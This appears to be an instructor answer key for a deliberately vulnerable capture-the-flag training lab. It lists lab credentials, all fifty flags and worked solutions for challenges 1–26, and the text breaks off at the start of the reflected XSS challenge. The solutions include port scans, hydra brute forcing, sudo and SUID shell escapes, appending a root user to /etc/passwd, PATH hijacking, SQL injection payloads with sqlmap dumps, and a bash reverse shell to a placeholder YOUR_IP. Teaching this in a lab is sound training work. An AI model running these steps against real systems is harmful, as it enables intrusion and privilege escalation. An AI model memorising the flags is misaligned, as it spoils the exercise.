# 🔐 InnovateTech Security Lab — Instructor Guide

> **INSTRUCTOR USE ONLY** — Do not distribute to students.
> All flags, exact commands, bypass techniques, and real-world context are documented below.

---

## Infrastructure Reference

| Service | Host Port | Container Port | Credentials |
|---|---|---|---|
| Web App (nginx → Flask) | 80, 8080 | 80 | admin/admin123 (web), admin/Adm1n@InnovateTech2024 (DB) |
| CTF Platform | 3000 | 3000 | none |
| API (Node.js) | 4000 | 4000 | user:password123 / admin:Adm1n@InnovateTech2024 |
| MySQL | 3306 | 3306 | root:root |
| Redis | 6379 | 6379 | none |
| MongoDB | 27017 | 27017 | none |
| FTP | 21 | 21 | anonymous:anything |
| SSH Target | 2222 | 22 | user:password123 / admin:iloveyou / devops:D3v0ps@2024 / root:toor |
| DNS | **5454** | 53 | none |
| Elasticsearch | 9200 | 9200 | none |
| Banner Service | 8888 | 8888 | nc connect |
| Internal Flag | (internal only) | 9999 | reachable via SSRF |

> **Note:** DNS port was remapped from 5353 to **5454** due to host mDNS conflict.

---

## Quick Flag Reference Table

| # | Challenge | Flag |
|---|---|---|
| 1 | Open Port Discovery | `FLAG{p0rt5_4r3_d00r5_t0_vuln5}` |
| 2 | FTP Anonymous Login | `FLAG{4n0n_ftp_s3rv3r_l34k5_d4t4}` |
| 3 | Service Banner Grabbing | `FLAG{b4nn3r5_r3v34l_v3rs10n5}` |
| 4 | DNS Zone Transfer | `FLAG{axfr_dump5_4ll_dns_r3c0rd5}` |
| 5 | Subdomain Enumeration | `FLAG{h1dd3n_subd0m41ns_3xp0s3d}` |
| 6 | Redis Without Authentication | `FLAG{r3d1s_n0_p4ssw0rd_m34ns_d4t4_3xp0s3d}` |
| 7 | MongoDB No Authentication | `FLAG{m0ng0_n04uth_m34ns_d4t4_l34k}` |
| 8 | MySQL Direct Connection | `FLAG{mysql_p0rt_3306_n3v3r_publ1c}` |
| 9 | HTTP Response Headers Audit | `FLAG{h34d3rs_t3ll_53cr3t5}` |
| 10 | Elasticsearch Open Access | `FLAG{3l4st1c_n0_4uth_1nd3x_3xp0s3d}` |
| 11 | SSH Default Credentials | `FLAG{ssh_d3f4ult_cr3d5_4r3_d34dly}` |
| 12 | SSH Weak Password (Brute Force) | `FLAG{w34k_p455w0rd5_4r3_3z_br34k}` |
| 13 | SUID Binary Exploitation | `FLAG{su1d_b1n4r13s_4r3_pr1v_3sc}` |
| 14 | Sudo Misconfiguration | `FLAG{sud0_n0p4sswd_1s_r00t}` |
| 15 | Cron Job Privilege Escalation | `FLAG{cr0n_j0b_wr1t3_4nd_0wn}` |
| 16 | World-Writable /etc/passwd | `FLAG{wr1t4bl3_p455wd_1s_g4m3_0v3r}` |
| 17 | .bash_history Credential Leak | `FLAG{h1st0ry_l34k5_s3cr3t5}` |
| 18 | Environment Variable Secrets | `FLAG{3nv_v4r5_4r3_n0t_s3cr3t}` |
| 19 | PATH Variable Hijacking | `FLAG{p4th_h1j4ck_g4v3_m3_r00t}` |
| 20 | Exposed SSH Private Key | `FLAG{priv4t3_k3y_l3ft_1n_publ1c}` |
| 21 | robots.txt Hidden Paths | `FLAG{r0b0t5_txt_1s_4_r0adm4p}` |
| 22 | Directory Listing Enabled | `FLAG{d1r3ct0ry_l1st1ng_3xp0s3s_f1l35}` |
| 23 | Default Admin Credentials | `FLAG{d3f4ult_cr3d5_4r3_4_g1ft}` |
| 24 | SQL Injection — Login Bypass | `FLAG{sq1_1nj3ct10n_byp455_l0g1n}` |
| 25 | SQL Injection — UNION Data Extraction | `FLAG{un10n_b4s3d_sqli_d4t4_dump}` |
| 26 | Blind SQL Injection | `FLAG{bl1nd_sqli_p4ti3nc3_p4y5}` |
| 27 | Reflected XSS | `FLAG{r3fl3ct3d_xss_st34ls_c00k135}` |
| 28 | Stored XSS | `FLAG{st0r3d_xss_p3rs1sts_f0r3v3r}` |
| 29 | CSRF | `FLAG{csrf_f0rc3d_4ct10ns_w1th0ut_c0ns3nt}` |
| 30 | Path Traversal | `FLAG{p4th_tr4v3rs4l_r34ds_4ny_f1l3}` |
| 31 | Local File Inclusion (LFI) | `FLAG{lf1_1nclud3s_s3cr3t_f1l3s}` |
| 32 | Command Injection | `FLAG{cmd_1nj3ct10n_0wns_th3_s3rv3r}` |
| 33 | IDOR | `FLAG{id0r_acc355_0th3r_us3r5_d4t4}` |
| 34 | Open Redirect | `FLAG{0p3n_r3d1r3ct_ph1sh1ng_v3ct0r}` |
| 35 | HTTP Method Tampering | `FLAG{h77p_m3th0d_t4mp3r1ng_byp4ss}` |
| 36 | JWT None Algorithm Attack | `FLAG{jwt_n0n3_4lg_byp4ss_4dm1n}` |
| 37 | JWT Weak Secret Cracking | `FLAG{w34k_jwt_s3cr3t_cr4ck3d}` |
| 38 | API Key Leaked in JavaScript | `FLAG{4p1_k3y_1n_js_1s_publ1c}` |
| 39 | SSRF | `FLAG{55rf_4ll0w5_1nt3rn4l_4cc355}` |
| 40 | XXE Injection | `FLAG{xxe_r34d5_l0c4l_f1l35}` |
| 41 | File Upload RCE | `FLAG{f1l3_upl04d_rce_g4m3_0v3r}` |
| 42 | GraphQL Introspection | `FLAG{gr4phql_1ntr0sp3ct10n_l34ks}` |
| 43 | Insecure Deserialization | `FLAG{d3s3r14l1z4t10n_rce_pwn3d}` |
| 44 | Clickjacking | `FLAG{cl1ckj4ck1ng_1nv1s1bl3_1fr4m3}` |
| 45 | Sensitive Data in HTML Comments | `FLAG{html_c0mm3nts_4r3_publ1c}` |
| 46 | Missing Security Headers | `FLAG{s3cur1ty_h34d3rs_pr0t3ct_y0u}` |
| 47 | Log Injection / Log4Shell Concept | `FLAG{l0g_1nj3ct10n_l0g4sh3ll_c0nc3pt}` |
| 48 | Exposed .env File | `FLAG{d0t_3nv_n3v3r_1n_w3b_r00t}` |
| 49 | Rate Limiting / DDoS Simulation | `FLAG{r4t3_l1m1t1ng_pr3v3nts_dd0s}` |
| 50 | Full Chain Attack | `FLAG{full_ch41n_3xpl01t_m4st3r}` |

---

# PHASE 1 — Network Reconnaissance (Challenges 1–10)

---

## Challenge 1 — Open Port Discovery
**Flag:** `FLAG{p0rt5_4r3_d00r5_t0_vuln5}`
**Target:** localhost (all ports)
**Tool:** nmap, nc

### Step-by-step solution
```bash
# Step 1: Full port scan with service detection
nmap -sV -p- localhost

# Step 2: Notice port 8888 is open (non-standard port)
# Output will show something like:
#   8888/tcp open  http

# Step 3: Connect and read the banner
nc localhost 8888
# The service prints the flag immediately in the banner output
```

### What the student sees
```
InnovateTech Internal Service v1.0
Flag: FLAG{p0rt5_4r3_d00r5_t0_vuln5}
WARNING: Authorized access only
```

### Real-world context
Every exposed port is an attack surface. Attackers use Shodan, Masscan, and nmap to map internet-facing services. The banner also leaks the service version — enough to look up known CVEs.

### Instructor tip
Run the demo live: show students the nmap output scrolling through all ports, then `nc localhost 8888`. Emphasise that attackers don't need credentials to find this — just an IP.

---

## Challenge 2 — FTP Anonymous Login
**Flag:** `FLAG{4n0n_ftp_s3rv3r_l34k5_d4t4}`
**Target:** localhost:21
**Tool:** ftp client

### Step-by-step solution
```bash
# Step 1: Connect to FTP
ftp localhost
# or: ftp -p localhost 21

# Step 2: When prompted, enter:
#   Name: anonymous
#   Password: anything@email.com   (any string accepted)

# Step 3: List files
ftp> ls
ftp> cd pub
ftp> ls

# Step 4: Download the flag
ftp> get flag.txt
ftp> quit

# Step 5: Read it
cat flag.txt
```

### Bonus files on the FTP server
```
/pub/flag.txt           → FLAG (main)
/pub/credentials.txt    → db_host, db_user, db_pass, jwt_secret, api_key
/pub/INTERNAL_REPORT.txt → "Security Status: CRITICAL, Last Audit: Never"
```

### Real-world context
Anonymous FTP was intended for public software mirrors in the 1990s. Many admins forget to disable it. Attackers routinely scan for port 21 and try anonymous login as a first move.

---

## Challenge 3 — Service Banner Grabbing
**Flag:** `FLAG{b4nn3r5_r3v34l_v3rs10n5}`
**Target:** localhost:2222 (SSH)
**Tool:** nc, nmap

### Step-by-step solution
```bash
# Method 1: netcat
nc localhost 2222
# The SSH banner prints immediately — do not authenticate, just read it

# Method 2: nmap version scan
nmap -sV -p 2222 localhost

# Method 3: SSH client (read banner before auth)
ssh -p 2222 user@localhost
# The banner appears before the password prompt
```

### What the student sees
```
##################################################
#  InnovateTech SSH Server v7.6p1 Ubuntu 22.04  #
#                                                #
#  FLAG{b4nn3r5_r3v34l_v3rs10n5}                #
#                                                #
#  WARNING: Unauthorized access is prohibited   #
##################################################
```

### Real-world context
SSH banners are commonly used for legal warnings ("unauthorized access prohibited") but when abused they leak version info. Attackers cross-reference SSH versions against CVE databases (e.g., OpenSSH 7.2 had user enumeration bugs).

### Instructor tip
Show students the `/etc/ssh/banner.txt` inside the container: `docker exec vuln-ssh cat /etc/ssh/banner.txt`

---

## Challenge 4 — DNS Zone Transfer
**Flag:** `FLAG{axfr_dump5_4ll_dns_r3c0rd5}`
**Target:** localhost:5454 (DNS — remapped from 5353)
**Tool:** dig

### Step-by-step solution
```bash
# Request a full zone transfer (AXFR = Authoritative Zone Transfer)
dig AXFR innovatetech.local @127.0.0.1 -p 5454

# The server returns ALL DNS records including the hidden TXT flag record:
# flag  IN  TXT  "FLAG{axfr_dump5_4ll_dns_r3c0rd5}"
```

### What gets revealed
```
; All A records (internal IP map):
www         172.28.0.3
api         172.28.0.11
admin       172.28.0.3
db          172.28.0.20
redis       172.28.0.21
internal    172.28.0.50
staging     172.28.0.101
backup      172.28.0.90

; TXT records (secrets!):
flag        "FLAG{axfr_dump5_4ll_dns_r3c0rd5}"
secrets     "db_pass=root jwt_secret=secret123 api_key=sk-prod-7f3k9x2mAbCdEf123456"
```

### Real-world context
Zone transfers should be restricted to trusted secondary nameservers only (via `allow-transfer` ACL in BIND). Misconfigured DNS exposes the entire internal network topology — every server name and IP — in one query.

---

## Challenge 5 — Subdomain Enumeration
**Flag:** `FLAG{h1dd3n_subd0m41ns_3xp0s3d}`
**Target:** innovatetech.local
**Tool:** gobuster, ffuf, or the zone file from Challenge 4

### Step-by-step solution
```bash
# Step 1: Add hosts entries (so browser resolves the domain)
echo "127.0.0.1 innovatetech.local" | sudo tee -a /etc/hosts
echo "127.0.0.1 admin.innovatetech.local" | sudo tee -a /etc/hosts
echo "127.0.0.1 dev.innovatetech.local" | sudo tee -a /etc/hosts

# Step 2: Enumerate with gobuster
gobuster dns -domain innovatetech.local \
  -w /usr/share/wordlists/dirb/common.txt \
  --resolver 127.0.0.1:5454

# Step 3: OR just use the zone transfer output from Challenge 4
#   which already lists all subdomains

# Step 4: Visit the admin subdomain
curl http://admin.innovatetech.local
# or in browser: http://admin.innovatetech.local
# The admin panel returns the flag
```

> **Shortcut:** If students completed Challenge 4, all subdomains are already visible in the AXFR dump. This challenge rewards combining information from prior challenges.

### Real-world context
Companies often run forgotten staging/dev/backup subdomains with weaker security. Bug bounty hunters routinely enumerate subdomains using tools like `subfinder`, `amass`, and `dnsx`.

---

## Challenge 6 — Redis Without Authentication
**Flag:** `FLAG{r3d1s_n0_p4ssw0rd_m34ns_d4t4_3xp0s3d}`
**Target:** localhost:6379
**Tool:** redis-cli

### Step-by-step solution
```bash
# Step 1: Connect — no password needed
redis-cli -h localhost

# Step 2: List all keys
127.0.0.1:6379> KEYS *

# Step 3: Get the main flag
127.0.0.1:6379> GET FLAG

# Step 4: Dump other sensitive data
127.0.0.1:6379> GET admin:password
127.0.0.1:6379> GET user:1:session
127.0.0.1:6379> HGETALL user:cache:999
```

### Stored data to show students
```
FLAG           → FLAG{r3d1s_n0_p4ssw0rd_m34ns_d4t4_3xp0s3d}
admin:password → Adm1n@InnovateTech2024
user:1:session → (JWT session token)
user:cache:999 → name=Super Admin, role=admin, password=Adm1n@InnovateTech2024
```

### Real-world context
In 2018, Redis was used to achieve full server RCE by writing to `~/.ssh/authorized_keys` or crontab via Redis `CONFIG SET dir` and `CONFIG SET dbfilename`. Tens of thousands of servers were compromised this way.

---

## Challenge 7 — MongoDB No Authentication
**Flag:** `FLAG{m0ng0_n04uth_m34ns_d4t4_l34k}`
**Target:** localhost:27017
**Tool:** mongosh

### Step-by-step solution
```bash
# Step 1: Connect — no password needed
mongosh localhost:27017

# Step 2: List all databases
> show dbs

# Step 3: Access the flags database
> use flagsdb
> db.flags.find().pretty()

# Step 4: Also check the employees database (sensitive PII)
> use employees
> db.users.find().pretty()
```

### Data exposed
```javascript
// flagsdb.flags
{ challenge: "MongoDB No Auth", flag: "FLAG{m0ng0_n04uth_m34ns_d4t4_l34k}", severity: "CRITICAL" }
{ challenge: "Data Exposure",   flag: "FLAG{n0sql_d4t4_3xp0sur3_r34l_w0rld}", severity: "HIGH" }

// employees.users — PII!
{ name: "Alice Johnson", ssn: "123-45-6789", salary: 95000, email: "alice@innovatetech.com" }
{ name: "Admin User", password: "p4ssw0rd!", secret: "FLAG{m0ng0_d4t4_3xp0s3d_n0_l0g1n}" }
```

### Real-world context
The "MongoDB Apocalypse" (January 2017): 27,000+ MongoDB instances were ransom-wiped in 48 hours. Attackers deleted data, left a ransom note, and demanded Bitcoin. All because the default install had no authentication.

---

## Challenge 8 — MySQL Direct Connection
**Flag:** `FLAG{mysql_p0rt_3306_n3v3r_publ1c}`
**Target:** localhost:3306
**Tool:** mysql client

### Step-by-step solution
```bash
# Step 1: Connect with default root credentials
mysql -h 127.0.0.1 -u root -proot

# Step 2: List all databases
mysql> SHOW DATABASES;

# Step 3: Use the app database
mysql> USE innovatetech;

# Step 4: List tables
mysql> SHOW TABLES;

# Step 5: Get the flag
mysql> SELECT * FROM flags;

# Step 6: Dump all user credentials (plaintext!)
mysql> SELECT * FROM users;

# Step 7: Read the secret_data table (SQLi prizes)
mysql> SELECT * FROM secret_data;

# One-liner:
mysql -h 127.0.0.1 -u root -proot -e "SELECT * FROM innovatetech.flags;"
```

### Real-world context
MySQL port 3306 must be firewalled from the internet. Database servers should sit on a private network accessible only by the app server. AWS RDS, for example, defaults to not publicly accessible for this reason.

---

## Challenge 9 — HTTP Response Headers Audit
**Flag:** `FLAG{h34d3rs_t3ll_53cr3t5}`
**Target:** http://localhost
**Tool:** curl, Burp Suite, browser DevTools

### Step-by-step solution
```bash
# Step 1: Fetch headers only
curl -I http://localhost

# Step 2: Look for the custom X-Secret-Flag header
# Output includes:
#   Server: nginx/1.14.0 (Ubuntu)         ← version disclosure
#   X-Powered-By: PHP/7.2.34              ← false but info leak
#   X-Secret-Flag: FLAG{h34d3rs_t3ll_53cr3t5}   ← the flag

# Step 3: Verbose mode to see everything
curl -v http://localhost 2>&1 | grep -i "x-\|server\|powered"
```

### Instructor notes
The response headers are set in `webapp/app.py` `after_request` hook. They intentionally reveal:
- Fake PHP version (social engineering / fingerprinting)
- The flag in `X-Secret-Flag`
- **Missing** security headers: no CSP, no X-Frame-Options, no HSTS

---

## Challenge 10 — Elasticsearch Open Access
**Flag:** `FLAG{3l4st1c_n0_4uth_1nd3x_3xp0s3d}`
**Target:** localhost:9200
**Tool:** curl, browser

### Step-by-step solution
```bash
# Step 1: Check what's running
curl http://localhost:9200/

# Step 2: List all indices
curl http://localhost:9200/_cat/indices?pretty

# Output shows the "internal-secrets" index — that shouldn't be public!

# Step 3: Dump the internal-secrets index
curl http://localhost:9200/internal-secrets/_search?pretty

# Flag is in the first hit's _source.flag field

# Step 4: Also dump employee data
curl http://localhost:9200/employees/_search?pretty
```

### Data exposed
```json
{
  "flag": "FLAG{3l4st1c_n0_4uth_1nd3x_3xp0s3d}",
  "data": "employee_ssn,salary_data,api_keys",
  "severity": "CRITICAL"
}
```

### Real-world context
In 2019, a security researcher discovered 1.2 billion records in an open Elasticsearch instance operated by a data broker. No authentication, no firewall. Always bind Elasticsearch to `127.0.0.1` and enable X-Pack security.

---

# PHASE 2 — Server & Linux Privilege Escalation (Challenges 11–20)

> **Prerequisites:** SSH into the target box first with default creds.
> ```bash
> ssh -p 2222 user@localhost   # password: password123
> ```

---

## Challenge 11 — SSH Default Credentials
**Flag:** `FLAG{ssh_d3f4ult_cr3d5_4r3_d34dly}`
**Target:** localhost:2222
**Credentials:** user / password123

### Step-by-step solution
```bash
# Step 1: Try the most common default credentials
ssh -p 2222 user@localhost
# Password: password123

# Step 2: Read the flag from the home directory
cat ~/flag.txt
```

### All valid SSH accounts on this box
| Username | Password | Notes |
|---|---|---|
| user | password123 | Standard user, has sudo for vim/python |
| admin | iloveyou | Brute-forced in Challenge 12 |
| devops | D3v0ps@2024 | DevOps team account |
| root | toor | Direct root login enabled |

---

## Challenge 12 — SSH Weak Password (Brute Force)
**Flag:** `FLAG{w34k_p455w0rd5_4r3_3z_br34k}`
**Target:** localhost:2222 user: admin
**Tool:** hydra

### Step-by-step solution
```bash
# Method 1: hydra with rockyou wordlist
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  ssh://localhost:2222 -t 4

# Method 2: hydra with a small common-password list
hydra -l admin -P /usr/share/wordlists/metasploit/common_passwords.txt \
  ssh://localhost:2222

# The password is: iloveyou  (rank ~17 in common password lists)

# Step 3: Login and read flag
ssh -p 2222 admin@localhost
# Password: iloveyou

cat ~/flag.txt
```

### Instructor tip
Run hydra in the background while explaining to students why `iloveyou` is so common (it was the #1 password in the 2009 RockYou breach — 32 million user credentials leaked in plaintext).

---

## Challenge 13 — SUID Binary Exploitation
**Flag:** `FLAG{su1d_b1n4r13s_4r3_pr1v_3sc}`
**Target:** SSH box (logged in as `user`)
**Technique:** SUID `find` binary → shell escape

### Step-by-step solution
```bash
# Step 1: Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Output includes: /usr/bin/find  ← unusual! find should not be SUID

# Step 2: Exploit find's -exec flag to run a command as root
/usr/bin/find . -exec /bin/bash -p \; -quit
# -p flag = privileged mode (keeps EUID = root)

# Step 3: Confirm root
whoami     # → root
id         # → uid=1000(user) gid=1000(user) euid=0(root)

# Step 4: Read the flag
cat /root/flag_suid.txt
```

### GTFOBins reference
`find` is listed on GTFOBins (gtfobins.github.io) — a curated list of Unix binaries that can be used to bypass local security restrictions.

### Real-world context
SUID (Set User ID) means the binary runs as its owner (root) regardless of who executes it. Common dangerous SUID binaries: find, vim, python, nmap, less, bash. Audit with: `find / -perm -4000 2>/dev/null`

---

## Challenge 14 — Sudo Misconfiguration
**Flag:** `FLAG{sud0_n0p4sswd_1s_r00t}`
**Target:** SSH box (logged in as `user`)
**Technique:** sudo vim NOPASSWD → shell escape

### Step-by-step solution
```bash
# Step 1: Check sudo privileges
sudo -l
# Output:
#   (root) NOPASSWD: /usr/bin/vim
#   (root) NOPASSWD: /usr/bin/python3
#   (root) NOPASSWD: /opt/backup_script.sh

# Step 2: Escape to root shell via vim
sudo vim -c ':!/bin/bash'
# Inside vim, type: :!/bin/bash   then press Enter

# Alternative via python3
sudo python3 -c 'import os; os.execl("/bin/bash","bash")'

# Step 3: Read the flag
cat /root/flag_sudo.txt
```

### Sudo entries (from /etc/sudoers)
```
user ALL=(root) NOPASSWD: /usr/bin/vim
user ALL=(root) NOPASSWD: /usr/bin/python3
user ALL=(root) NOPASSWD: /opt/backup_script.sh
```

### Real-world context
The principle of least privilege: users should only be able to sudo specific commands that require root, never interactive shells or interpreters. GTFOBins lists escape techniques for vim, python, less, nano, and 150+ others.

---

## Challenge 15 — Cron Job Privilege Escalation
**Flag:** `FLAG{cr0n_j0b_wr1t3_4nd_0wn}`
**Target:** SSH box (logged in as `user`)
**Technique:** World-writable cron script owned by root

### Step-by-step solution
```bash
# Step 1: Check /etc/crontab for root-owned jobs
cat /etc/crontab
# Output:
#   * * * * * root /opt/cleanup.sh

# Step 2: Check permissions on the script
ls -la /opt/cleanup.sh
# -rwxrwxrwx 1 root root  ← world-writable!

# Step 3: Inject a reverse shell or read the flag
echo 'cp /root/flag_cron.txt /tmp/cron_flag.txt && chmod 777 /tmp/cron_flag.txt' >> /opt/cleanup.sh

# Step 4: Wait up to 1 minute for cron to run
sleep 60
cat /tmp/cron_flag.txt

# Alternative: inject a reverse shell
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /opt/cleanup.sh
# Listen: nc -lvnp 4444
```

### Real-world context
Cron jobs running as root that execute world-writable scripts are a classic privilege escalation path. Always check: `ls -la $(grep -r CRON /etc/cron* | awk '{print $NF}')` for writable scripts.

---

## Challenge 16 — World-Writable /etc/passwd
**Flag:** `FLAG{wr1t4bl3_p455wd_1s_g4m3_0v3r}`
**Target:** SSH box (logged in as `user`)
**Technique:** Modify /etc/passwd to add a root-level user

### Step-by-step solution
```bash
# Step 1: Check /etc/passwd permissions
ls -la /etc/passwd
# -rw-rw-rw- 1 root root   ← world-writable!

# Step 2: Generate a password hash
openssl passwd -1 hacked123
# Example output: $1$abc$XYZ...

# Step 3: Append a new root user (UID=0, GID=0)
echo 'hacker:$1$abc$XYZ...:0:0::/root:/bin/bash' >> /etc/passwd

# Simpler method (no password hash needed — use empty password field):
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd

# Step 4: Switch to the new user
su hacker
# If empty password: just press Enter

# Step 5: Read the flag
cat /root/flag_passwd.txt
```

### Real-world context
`/etc/passwd` should be 644 (world-readable, root-writable). Shadow password system (`/etc/shadow`) holds actual hashes and should be 640 or 000. Any user with write access to /etc/passwd can instantly become root.

---

## Challenge 17 — .bash_history Credential Leak
**Flag:** `FLAG{h1st0ry_l34k5_s3cr3t5}`
**Target:** SSH box (logged in as `user`)
**Technique:** Read bash history for leaked credentials

### Step-by-step solution
```bash
# Step 1: Read the history file
cat ~/.bash_history

# Output reveals:
#   mysql -u admin -p'SecretDB@2024' -h db.internal
#   curl -u admin:P@ssw0rd123 http://internal-api/v1/users
#   ssh admin@10.0.1.5 -i ~/.ssh/id_rsa_backup
#   FLAG{h1st0ry_l34k5_s3cr3t5}        ← flag is literally in history!
```

### Real-world context
Developers often paste credentials directly into terminals (to set env vars, test API calls, etc.) and they get recorded in `.bash_history`. The fix is: clear history with `history -c`, use `HISTCONTROL=ignorespace` (prefix command with space to skip logging), or use a secrets manager.

---

## Challenge 18 — Environment Variable Secrets
**Flag:** `FLAG{3nv_v4r5_4r3_n0t_s3cr3t}`
**Target:** SSH box (logged in as `user`)
**Technique:** Read environment variables from .bashrc

### Step-by-step solution
```bash
# Method 1: Load and print the env
source ~/.bashrc
echo $SECRET_FLAG
env | grep -i flag
printenv SECRET_FLAG

# Method 2: Read .bashrc directly
cat ~/.bashrc
# Contains:
#   export SECRET_FLAG="FLAG{3nv_v4r5_4r3_n0t_s3cr3t}"
#   export API_KEY="sk-internal-9f3kAbCd"
#   export DB_PASSWORD="root"

# Method 3: If process is running, read from /proc
cat /proc/1/environ | tr '\0' '\n' | grep -i secret
```

### Real-world context
Environment variables are visible to any user on the system who can read `/proc/<pid>/environ` for that process, or to anyone who can access the container. Use HashiCorp Vault, AWS Secrets Manager, or Docker secrets — not env vars — for production secrets.

---

## Challenge 19 — PATH Variable Hijacking
**Flag:** `FLAG{p4th_h1j4ck_g4v3_m3_r00t}`
**Target:** SSH box (logged in as `user`)
**Technique:** Place a fake binary earlier in PATH than the real one

### Step-by-step solution
```bash
# Step 1: Check what sudo script calls
cat /opt/backup_script.sh
# Content: #!/bin/bash\nservice backup start
# "service" is called without full path!

# Step 2: Create a fake "service" binary in /tmp
echo '#!/bin/bash' > /tmp/service
echo 'cat /root/flag_path.txt > /tmp/path_flag.txt' >> /tmp/service
echo 'chmod 777 /tmp/path_flag.txt' >> /tmp/service
chmod +x /tmp/service

# Step 3: Prepend /tmp to PATH so our fake binary is found first
export PATH=/tmp:$PATH

# Step 4: Run the sudo script (it will call our fake "service")
sudo /opt/backup_script.sh

# Step 5: Read the flag
cat /tmp/path_flag.txt
```

### Real-world context
PATH hijacking requires that a privileged script calls a binary by name without a full path (`service` instead of `/usr/sbin/service`). Always use absolute paths in scripts that run with elevated privileges.

---

## Challenge 20 — Exposed SSH Private Key
**Flag:** `FLAG{priv4t3_k3y_l3ft_1n_publ1c}`
**Target:** http://localhost/backup/id_rsa
**Technique:** Download private key from web-exposed backup directory

### Step-by-step solution
```bash
# Step 1: Browse the /backup/ directory listing (found in Challenge 22 too)
curl http://localhost/backup/

# Step 2: Download the private key
curl http://localhost/backup/id_rsa

# The key file contains the flag in a comment at the bottom:
# FLAG{priv4t3_k3y_l3ft_1n_publ1c}

# Step 3: In a real scenario — use the key to SSH as root
chmod 600 id_rsa
ssh -i id_rsa root@localhost -p 2222
# (This works on the actual SSH container where the key was generated)
```

### Real-world context
In 2021, a researcher found AWS private keys in public GitHub repositories at a rate of one every 4 minutes. The GitHub Secret Scanning feature now detects these. Private keys in web directories are equally dangerous.

---

# PHASE 3 — Web Security Basics (Challenges 21–35)

> **Target:** http://localhost

---

## Challenge 21 — robots.txt Hidden Paths
**Flag:** `FLAG{r0b0t5_txt_1s_4_r0adm4p}`
**Target:** http://localhost/robots.txt
**Tool:** browser or curl

### Step-by-step solution
```bash
# Step 1: Read robots.txt
curl http://localhost/robots.txt

# Output:
# User-agent: *
# Disallow: /admin-secret-panel/
# Disallow: /backup/
# Disallow: /secret-flag/
# Disallow: /.env
# Disallow: /api/internal/

# Step 2: Visit one of the "disallowed" paths
curl http://localhost/secret-flag/
# Returns HTML with the flag
```

### Real-world context
`robots.txt` is designed to tell search engine crawlers which pages NOT to index — but it is publicly readable by anyone. Attackers routinely read it as a "treasure map" of hidden admin panels and sensitive directories. Never list sensitive paths in robots.txt.

---

## Challenge 22 — Directory Listing Enabled
**Flag:** `FLAG{d1r3ct0ry_l1st1ng_3xp0s3s_f1l35}`
**Target:** http://localhost/backup/
**Tool:** browser or curl

### Step-by-step solution
```bash
# Step 1: Visit the backup directory
curl http://localhost/backup/
# Returns an HTML directory listing with all files

# Step 2: Download the flag
curl http://localhost/backup/flag.txt

# Step 3: Also explore other files
curl http://localhost/backup/config.bak     # has DB password, JWT secret
curl http://localhost/backup/id_rsa         # private SSH key (Challenge 20)
```

### Files in /backup/ and what they reveal
| File | Content |
|---|---|
| flag.txt | `FLAG{d1r3ct0ry_l1st1ng_3xp0s3s_f1l35}` |
| config.bak | DB creds, JWT secret, admin password |
| id_rsa | SSH private key |
| database_backup_2024.sql | Full database dump |
| users_export.csv | All user emails and info |

---

## Challenge 23 — Default Admin Credentials
**Flag:** `FLAG{d3f4ult_cr3d5_4r3_4_g1ft}`
**Target:** http://localhost/admin
**Credentials:** admin / admin123

### Step-by-step solution
```bash
# Method 1: Browser — navigate to http://localhost/admin
# Username: admin
# Password: admin123

# Method 2: curl
curl -c cookies.txt -b cookies.txt \
  -X POST http://localhost/admin \
  -d "username=admin&password=admin123" \
  -L

# The admin dashboard displays the flag
```

### Real-world context
Mirai botnet (2016) compromised 600,000 IoT devices using 61 hardcoded default credential pairs (admin/admin, admin/1234, root/root, etc.). It then launched a DDoS that took down half the US internet. Always change default credentials.

---

## Challenge 24 — SQL Injection — Login Bypass
**Flag:** `FLAG{sq1_1nj3ct10n_byp455_l0g1n}`
**Target:** http://localhost/login
**Technique:** Classic `'--` comment injection

### Step-by-step solution
```bash
# Method 1: Browser login form
# Username: admin'--
# Password: anything

# Method 2: curl
curl -X POST http://localhost/login \
  -d "username=admin'--&password=anything" \
  -L

# The vulnerable query becomes:
# SELECT * FROM users WHERE username='admin'--' AND password='anything'
# The -- comments out the password check!
```

### Vulnerable code (webapp/app.py)
```python
query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
```

### Other working payloads
```
username: ' OR '1'='1'--
username: admin' OR 1=1--
username: ' OR 1=1#
```

---

## Challenge 25 — SQL Injection — UNION Data Extraction
**Flag:** `FLAG{un10n_b4s3d_sqli_d4t4_dump}`
**Target:** http://localhost/search?q=
**Technique:** UNION-based SQLi to read from other tables

### Step-by-step solution
```bash
# Step 1: Test for injection
curl "http://localhost/search?q=test'"
# Returns a database error — confirms SQLi

# Step 2: Find the number of columns
curl "http://localhost/search?q=test' ORDER BY 4--"
# Try 1,2,3,4 until no error — 4 columns

# Step 3: UNION to dump the secret_data table
curl "http://localhost/search?q=x' UNION SELECT 1,flag,3,4 FROM secret_data--"

# The flag appears in search results as a product description
```

### What gets extracted
```sql
SELECT flag FROM secret_data:
  FLAG{un10n_b4s3d_sqli_d4t4_dump}
  FLAG{bl1nd_sqli_p4ti3nc3_p4y5}
```

---

## Challenge 26 — Blind SQL Injection
**Flag:** `FLAG{bl1nd_sqli_p4ti3nc3_p4y5}`
**Target:** http://localhost/api/user?id=
**Technique:** Boolean-based blind SQLi

### Step-by-step solution
```bash
# Step 1: Confirm the endpoint
curl "http://localhost/api/user?id=1"
# Returns user data

# Step 2: Test boolean-based blind injection
curl "http://localhost/api/user?id=1 AND 1=1"   # returns data   = TRUE
curl "http://localhost/api/user?id=1 AND 1=2"   # returns empty  = FALSE
# Different responses confirm blind SQLi!

# Step 3: Shortcut — use sqlmap
sqlmap -u "http://localhost/api/user?id=1" --dbs
sqlmap -u "http://localhost/api/user?id=1" -D innovatetech -T secret_data --dump

# Step 4: Or use UNION shortcut on this endpoint
curl "http://localhost/api/user?id=0 UNION SELECT flag,2,3 FROM secret_data LIMIT 1,1"
```

### Manual boolean extraction (teach the concept)
```bash
# Extract length of first flag character by character:
curl "http://localhost/api/user?id=1 AND SUBSTRING((SELECT flag FROM secret_data LIMIT 0,1),1,1)='F'"
# If returns data → first char is F
```

### Flag location
The flag is in `secret_data` table row 2: `FLAG{bl1nd_sqli_p4ti3nc3_p4y5}`

---

## Challenge 27 — Reflected XSS
**Flag:** `FLAG{r3fl3ct3d_xss_st34ls_c00k135}`
**Target:** http://localhost/search?q=
**Technique:** Inject script tag into search parameter

### Step-by-step solution
```bash
# Step 1: Test for reflection
# Browser: http://localhost/search?q=<h1>test</h1>
# If "test" appears as a heading → HTML injection confirmed

